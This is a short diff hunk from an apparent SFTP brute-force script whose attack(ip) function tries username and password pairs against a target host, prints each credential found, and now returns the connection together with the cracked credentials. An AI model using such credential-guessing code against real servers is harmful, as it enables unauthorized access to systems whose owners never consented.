@@ -15,6 +15,6 @@ def attack(ip):
 				print(colored(Fore.YELLOW + ip + ' --> ' + username + '  ' + password))
 				handle = sftp.Connection(host = ip, username=username, password = password, cnopts=CnOpts)
 				print(colored(Fore.GREEN + 'Username: ' + username + '\nPassword: ' + password))
-				return handle
+				return (handle, username, password)
 			except:
 				pass
